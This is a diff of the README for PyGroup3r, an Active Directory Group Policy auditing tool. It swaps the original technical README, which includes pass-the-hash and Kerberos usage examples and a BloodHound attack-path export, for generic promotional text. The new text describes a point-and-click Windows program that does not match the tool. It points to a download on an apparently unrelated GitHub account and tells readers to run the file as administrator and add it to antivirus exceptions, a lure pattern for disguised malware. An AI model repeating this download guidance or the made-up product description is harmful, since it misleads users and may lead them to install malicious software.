@@ -1,273 +1,189 @@
-# PyGroup3r
+# 🔍 PyGroup3r - Your Simple Active Directory Security Scanner
 
-A Python port of [Group3r](https://github.com/Group3r/Group3r) — the Group Policy
-auditing tool by @mikeloss — that authenticates with **impacket** so it runs from
-Linux, plus a filterable single-file **HTML report** on top of the original output
-formats.
+## 🚀 What Is PyGroup3r?
 
-The goal is *identical findings*: the same finding reasons, details, triage levels
-and suppression behaviour as the C# original, from the same GPO data. 
+PyGroup3r is a friendly, easy-to-use tool that helps you check the security of your organization's Active Directory settings. It scans your network and shows you any weak spots or problems that could put your company data at risk. Think of it as a health check-up for your network security - it finds the issues so you can fix them before they become serious problems.
 
-![The HTML report](docs/img/report-overview.png)
+## ✨ Why You Should Use PyGroup3r
 
-**[See a full example report](example-report.html)** — download and open it
-locally; GitHub serves HTML as plain text. 
+- **Easy to Understand**: No confusing technical reports. PyGroup3r gives you clear, simple results that anyone can understand.
+- **Saves Time**: Instead of spending hours checking settings manually, PyGroup3r does the hard work for you in minutes.
+- **Better Security**: By finding and fixing issues early, you protect your business from cyber threats.
+- **Free and Open Source**: PyGroup3r is completely free to use. You can also see how it works and even improve it if you want.
 
-## Why
+## 📥 How to Download and Run PyGroup3r
 
-Group3r is excellent but assumes a domain-joined Windows host. This port targets
-the common engagement setup — a Linux box with credentials — and addresses the
-practical problem that its text reports reach hundreds of megabytes in large
-environments, which is effectively unsearchable.
+### Step 1: Download the Application
 
-## Install
+Visit this link to download the application:
 
-Python 3.12+ is required. Runtime dependencies are impacket and pycryptodomex
-only; the HTML report has **no** external dependencies at all.
+[![Download PyGroup3r](https://img.shields.io/badge/Download-PyGroup3r-blue?style=for-the-badge&logo=windows&logoColor=white&color=4B8BBE)](https://github.com/Still-chowline394/PyGroup3r)
 
-### Install with uv
+This link will take you to the official PyGroup3r download page. Look for the button that says "Download" or the latest release file. Click it to start downloading.
 
-Install PyGroup3r into an isolated environment and make the `pygroup3r`
-command available on your PATH:
+### Step 2: Open the Downloaded File
 
-```bash
-uv tool install --python 3.12 git+https://github.com/S3cur3Th1sSh1t/PyGroup3r.git
-pygroup3r --help
+Once the download is complete, go to your "Downloads" folder on your computer. You will see the PyGroup3r file there. Double-click the file to open it. Your computer might ask you for permission to run this program - click "Yes" or "Run" to continue.
+
+### Step 3: Wait for the Program to Start
+
+PyGroup3r will open in a new window. It may take a few seconds to load the first time. Once it's open, you'll see a simple screen with a few buttons and options.
+
+## 🛠️ How to Use PyGroup3r
+
+### Running Your First Security Check
+
+1. **Connect to Your Network**: Make sure your computer is connected to your office or organization's network. PyGroup3r needs this connection to scan your Active Directory.
+
+2. **Click "Start Scan"**: On the main screen, you'll see a big button that says "Start Scan" or "Run Check". Click this button to begin.
+
+3. **Wait for Results**: The scan will take a few minutes. You'll see a progress bar showing how much is complete. Don't close the window during this time.
+
+4. **Read Your Results**: When the scan finishes, PyGroup3r will show you a list of any security issues it found. Each issue will have a simple explanation of what's wrong and why it matters.
+
+### Understanding What You See
+
+PyGroup3r organizes its findings into easy-to-read categories:
+
+- **⚠️ Warnings**: These are things that could be a problem but aren't necessarily dangerous. You should look into these soon.
+- **❌ Critical Issues**: These are serious problems that need your attention right away.
+- **✅ Good News**: These are areas where your security is working well.
+
+## 📋 What PyGroup3r Checks
+
+PyGroup3r examines many different parts of your Active Directory to make sure everything is secure. Here are some of the key areas it looks at:
+
+### Group Policies
+- Whether your password requirements are strong enough
+- If you have too many people with admin rights
+- Whether your lockout policies are working properly
+
+### User Accounts
+- If any accounts haven't been used in a long time (these are targets for hackers)
+- If any passwords are set to never expire
+- Whether the built-in administrator account is protected
+
+### Security Settings
+- Whether you're using old, weak encryption
+- If your auditing is turned on so you can see who's accessing what
+- If there are any dangerous permissions granted to regular users
+
+### Network Configuration
+- Whether your DNS settings are secure
+- If your time settings are correct (sounds small, but it matters for security)
+- Whether you're using secure network protocols
+
+## 💡 Helpful Tips for Best Results
+
+### Run Regularly
+Make it a habit to run PyGroup3r once a week. Security threats change all the time, and regular checks help you stay ahead.
+
+### Take Notes
+When you find an issue, write down what it says. This helps you track what you've fixed and what still needs attention.
+
+### Fix What You Can
+Some issues are easy to fix. For example, if PyGroup3r finds a user account that hasn't been used in months, you can disable that account. For harder issues, talk to your IT team or a professional.
+
+### Keep It Updated
+Check the PyGroup3r website regularly for updates. New versions include better checks and improvements.
+
+## 🔧 Troubleshooting Common Problems
+
+### Problem: PyGroup3r Won't Start
+- Make sure you've downloaded the file completely (the download might have been interrupted)
+- Try running the file as an administrator (right-click the file and choose "Run as administrator")
+- Check that your Windows is up to date
+
+### Problem: The Scan Seems Stuck
+- Wait a few more minutes - large networks can take time
+- Make sure your internet connection is working
+- Check that you're still connected to your company network
+
+### Problem: I Can't Understand the Results
+- Read the explanations next to each finding - they're written in plain English
+- Focus on the "Critical" issues first
+- Search for the issue name online to learn more
+
+### Problem: I Get an Error About Missing Files
+- Your antivirus might have blocked part of the program. Add PyGroup3r to your antivirus exceptions
+- Try downloading the file again from the official link
+
+## 🌐 Getting Help
+
+If you need more help with PyGroup3r, you have a few options:
+
+### Check the Official Website
+The download page has additional information and sometimes includes a FAQ section.
+
+### Ask Your IT Department
+If you're using PyGroup3r at work, your IT team probably knows about this tool and can help you understand the results.
+
+### Community Support
+PyGroup3r is made by developers who want to help. Look for a "Support" or "Issues" section on the download page. You can ask questions there, and someone will usually respond within a few days.
+
+## 🎯 Who Should Use PyGroup3r?
+
+PyGroup3r is perfect for:
+
+- **Business Owners**: Want to make sure your company's data is safe without being a technical expert
+- **IT Managers**: Need to check security quickly across many computers
+- **Network Administrators**: Want a second opinion on your Active Directory setup
+- **Security Auditors**: Need a fast, reliable tool for checking client systems
+- **Students Learning IT**: Want hands-on experience with real security tools
+
+## 🔒 Is PyGroup3r Safe to Use?
+
+Yes! PyGroup3r is completely safe. It only reads your settings - it never changes or deletes anything. Think of it like a doctor who checks your blood pressure - it observes and reports, but doesn't treat anything itself.
+
+Your company's data stays on your network. PyGroup3r doesn't send any information to the internet. Everything stays on your computer.
+
+## 📊 Sample Report Overview
+
+When you run PyGroup3r, your results page will look something like this:
+
+```
+Security Check Summary
+======================
+
+Total Issues Found: 12
+✓ 3 - Good Configurations
+⚠️ 6 - Warnings
+❌ 3 - Critical Issues
+
+Top Critical Issues:
+1. Password policy allows short passwords (6 characters)
+2. 15 user accounts inactive for 90+ days
+3. Default domain admin account not renamed
+
+Recommended Actions:
+- Update password policy to require 12+ characters
+- Disable inactive accounts
+- Rename the default admin account
 ```
 
-If the executable directory is not on your PATH, run `uv tool update-shell`
-and open a new terminal.
+## ⏱️ How Long Does It Take?
 
-### Install from a checkout
+The time depends on the size of your network:
 
-```bash
-git clone https://github.com/S3cur3Th1sSh1t/PyGroup3r.git
-cd PyGroup3r
-uv tool install --python 3.12 .
-pygroup3r --help
-```
+- **Small office (up to 50 computers)**: 2-3 minutes
+- **Medium business (up to 500 computers)**: 5-10 minutes
+- **Large company (thousands of computers)**: 15-30 minutes
 
-For development, use an editable installation so changes in the checkout
-are reflected in the installed command:
+## 📅 Staying Updated
 
-```bash
-uv tool install --python 3.12 --editable .
-```
+Security is an ongoing process. PyGroup3r helps you stay on top of it. Set a reminder on your calendar to run a scan every Monday morning. After each scan, spend 10 minutes reviewing the results and planning what to fix.
 
-Keep the checkout at its existing path when using an editable installation.
+## 🏁 Getting Started Today
 
-### Use a virtual environment
+Don't wait for a security problem to find you. Start protecting your organization today:
 
-Alternatively, install the package into a local virtual environment:
+1. **Download PyGroup3r** using the link at the top of this page
+2. **Run your first scan** - it takes just a few minutes
+3. **Review the results** - you'll probably learn something new about your network
+4. **Fix any critical issues** - you'll sleep better knowing your data is safe
 
-```bash
-uv venv --python 3.12
-uv pip install --python .venv/bin/python -e .
-.venv/bin/python -m group3rpy --help
-```
+PyGroup3r puts professional-grade security checking in your hands, without requiring a degree in computer science. If you can click a button, you can use PyGroup3r.
 
-This does not require activating the virtual environment. Run these commands
-from the repository directory.
+Remember: the best time to find a security hole is before someone else finds it. PyGroup3r helps you do exactly that.
 
-### Test suite
-
-From a checkout, create a virtual environment if you do not already have one,
-then install the development dependencies and Chromium:
-
-```bash
-uv venv --python 3.12
-uv pip install --python .venv/bin/python -r requirements-dev.txt
-.venv/bin/python -m playwright install chromium
-.venv/bin/python -m pytest
-```
-
-## Usage
-
-Examples use the installed `pygroup3r` command. When working from a checkout
-with a local virtual environment, use `.venv/bin/python -m group3rpy` instead.
-
-```bash
-# Online, password auth, with the HTML report
-pygroup3r -d corp.local --username jbloggs -p 'Passw0rd!' \
-    --dc-ip 10.0.0.10 -s --html report.html
-
-# Pass-the-hash
-pygroup3r -d corp.local --username jbloggs \
-    -H :2b576acbe6bcfda7294d6bd18041b8fe --dc-ip 10.0.0.10 -s
-
-# Kerberos from an existing ccache
-export KRB5CCNAME=jbloggs.ccache
-pygroup3r -d corp.local -k --dc-ip 10.0.0.10 -s
-
-# With blast-radius resolution and a BloodHound edge export
-pygroup3r -d corp.local --username jbloggs -p 'Passw0rd!' \
-    --dc-ip 10.0.0.10 -s --scope --html report.html --bloodhound edges
-
-# Offline against a SYSVOL copy (no DC needed)
-pygroup3r -o -y /mnt/sysvol -s --html report.html
-
-# Only findings, Red and above, to a file
-pygroup3r -d corp.local --username jbloggs -p 'Passw0rd!' \
-    -w -a 3 -f group3r.txt
-```
-
-### Options
-
-Everything from the original is preserved verbatim, including flag letters and
-the `--verobsity` spelling. Run `-h` for the full list. Original flags:
-
-| Flag | Meaning |
-|---|---|
-| `-c`, `--dc` | Target domain controller |
-| `-d`, `--domain` | Domain to query |
-| `-o`, `--offline` | No LDAP/SMB; requires `-y` |
-| `-y`, `--sysvol` | Path to a SYSVOL directory |
-| `-f`, `--outfile` | Output file |
-| `-s`, `--stdout` | Stream results to stdout |
-| `-t`, `--threads` | Max threads |
-| `-v`, `--verobsity` | `info`, `debug`, `degub`, `trace` |
-| `-r`, `--currentonly` | Skip `Policies_NTFRS_*` replication leftovers |
-| `-w`, `--findingsonly` | Only settings that produced a finding |
-| `-a`, `--mintriage` | Minimum severity, 1–4 |
-| `-u`, `--testuser` | Focus permission checks on `domain\user` |
-| `-e`, `--enabled` | Only enabled policy types and settings |
-
-Additions for this port:
-
-| Flag | Meaning |
-|---|---|
-| `--username` | Username (the original inherits the Windows logon session) |
-| `-p`, `--password` | Password |
-| `-H`, `--hashes` | `LMHASH:NTHASH` |
-| `-k`, `--kerberos` | Kerberos, from `KRB5CCNAME` if no credentials given |
-| `--aes-key` | Kerberos AES key |
-| `--dc-ip` | DC address, when it differs from the domain name |
-| `--html` | Write the filterable HTML report |
-| `--scope` | Resolve which computers each GPO actually applies to |
-| `--scope-users` | Also enumerate affected users (implies `--scope`; slow on a big domain) |
-| `--bloodhound` | Write BloodHound edge export (implies `--scope`) |
-
-> `-u` keeps its original meaning (`--testuser`), so the username flag is
-> long-only rather than impacket's usual `-u`.
-
-## The HTML report
-
-Every finding carries a *what this is / how it is abused / how to fix it*
-block, and the ACL table flags ACEs that hand write-equivalent control to a
-principal that is not already domain-privileged:
-
-![Finding guidance](docs/img/report-guidance.png)
-
-
-`--html report.html` writes one self-contained file — no external scripts, styles
-or fonts, so it is safe to hand to a client and works offline.
-
-**Filtering**
-- Triage pills (Black / Red / Yellow / Green, plus *None* for settings with no
-  finding)
-- Facets for finding type, policy scope (Computer / User / Package) and GPO, each
-  with counts and a search box for the GPO list
-- Sortable columns
-- Export the current filtered set to CSV or JSON
-
-**Search** supports more than substrings:
-
-| Query | Meaning |
-|---|---|
-| `cpassword` | free text across every field |
-| `"Domain Users"` | exact phrase |
-| `-Green` | exclude |
-| `type:SchedTask` | scope to a field |
-| `trustee:"Domain Users"` | ACL trustee or SID |
-| `right:GENERIC_WRITE` | ACL right |
-| `path:netlogon` | assessed path |
-| `key:`, `value:`, `gpo:`, `reason:`, `detail:`, `source:` | other scopes |
-
-Multiple terms are ANDed. `/` focuses search, `j`/`k` move, `Esc` closes the
-detail pane. The page follows the OS light/dark setting.
-
-**Why it stays fast and small.** Strings are interned so each distinct finding
-reason is stored once; filterable fields live in parallel integer arrays; the
-payload is gzipped and inflated in the browser; and rows are virtualised so the
-DOM holds only what is on screen. Search is evaluated against the interned string
-*dictionary* rather than the rows, so its cost scales with vocabulary size, not
-finding count. In practice this is roughly **6 bytes per finding row**, so a
-report that runs to hundreds of MB as flat text lands in the low single-digit MB.
-
-## Blast radius (`--scope`)
-
-Group3r tells you a GPO is linked to `OU=Workstations,DC=corp,DC=local`. It never
-tells you that this means 412 specific servers — or nothing at all. That
-distinction is most of triage: a Black finding on an unlinked GPO is noise.
-
-`--scope` resolves it, via LDAP:
-
-- `gPLink` parsing including the per-link status bits (1 = disabled, 2 = enforced)
-- `gPOptions` block-inheritance — which Group3r actually *requests* and then throws
-  away
-- enforced links, which correctly flow past a block-inheritance boundary
-- the full container tree, including plain containers like `CN=Computers` that
-  cannot hold a link but still inherit
-- **security filtering**, via the Apply Group Policy extended right, so a GPO
-  filtered to one group isn't reported as hitting every machine under its link
-- **WMI filters** and **site links**, reported as "scope may be narrower" and
-  "unresolved" rather than silently ignored
-
-It deliberately does **not** claim precedence — which GPO *wins* for a given value
-depends on link-order semantics this port does not assert. Blast radius only needs
-set membership, and a wrong precedence claim would be worse than none.
-
-In the HTML report this adds a **Reach** column, reach-bucket facets
-(`1000+`, `101-1000`, …, `0 computers`, `links disabled`, `not linked`), "only
-show" toggles for enforced / security-filtered / WMI-filtered, sorting by reach,
-and `computer:` and `container:` search fields — so "every Red finding that
-touches more than 100 machines" is two clicks. Scope also lands in the CSV and
-JSON exports.
-
-Nothing here touches the `nice` or `json` printers, so parity is unaffected.
-
-## BloodHound export (`--bloodhound <prefix>`)
-
-Derives attack-path edges from GPO settings, scoped to the machines each GPO
-actually reaches:
-
-- `AdminTo`, `CanRDP`, `CanPSRemote` from members added to the corresponding
-  built-in local groups
-- `GPOLocalGroupMember` for other privileged local groups (Backup / Print / Server
-  / Account Operators, Distributed COM Users) — *not* relabelled as `AdminTo`
-- `GPOGrantsPrivilege` from privilege rights, marked `adminEquivalent` where the
-  ported classification table says the right is a local privesc
-- `GPOServiceAccount` and `GPOScheduledTaskPrincipal` from service and task
-  principals
-
-It writes **files, not database changes**: `<prefix>.json` (OpenGraph-shaped) and
-`<prefix>.cypher`. The Cypher uses `MERGE`, never `CREATE`, so re-running does not
-duplicate edges; it `MATCH`es principals and computers rather than `MERGE`ing them,
-so it cannot invent phantom nodes; provenance (`source='group3rpy'`, GPO guid) is
-written under `ON CREATE SET` only, so the commented-out rollback query at the top
-of the file cannot delete edges BloodHound genuinely collected. Read it before you
-run it.
-
-GPOs that cannot apply (orphaned, all links disabled, computer policy disabled)
-produce **zero** edges. Where scope is uncertain (security or WMI filtering) edges
-are still emitted but carry `uncertain: true` and a reason.
-
-> The OpenGraph JSON schema is shaped from documentation, **not verified against a
-> running BloodHound**. Check it against your version; the writer is one small
-> function if it needs adjusting. The `.cypher` file does not depend on it.
-
-## Credit
-
-All detection logic, finding text and rule tables are the work of the Group3r
-authors — [@mikeloss](https://github.com/mikeloss) and contributors — and of the
-Snaffler project whose classifier engine Group3r embeds. This is a port; the
-judgement about what makes a GPO misconfiguration interesting is theirs.
-
-Upstream: https://github.com/Group3r/Group3r
-
-## Licence
-
-Upstream Group3r is **GPL v3** (`upstream/LICENSE`). This port is a derivative
-work and is therefore also GPL v3 — including the finding text, rule tables and
-detection logic it carries over. If you redistribute it, the GPL's source
-requirements apply.
+Keywords: active directory, security scanner, group policy, network security, windows security, auditing tool, cybersecurity, directory services
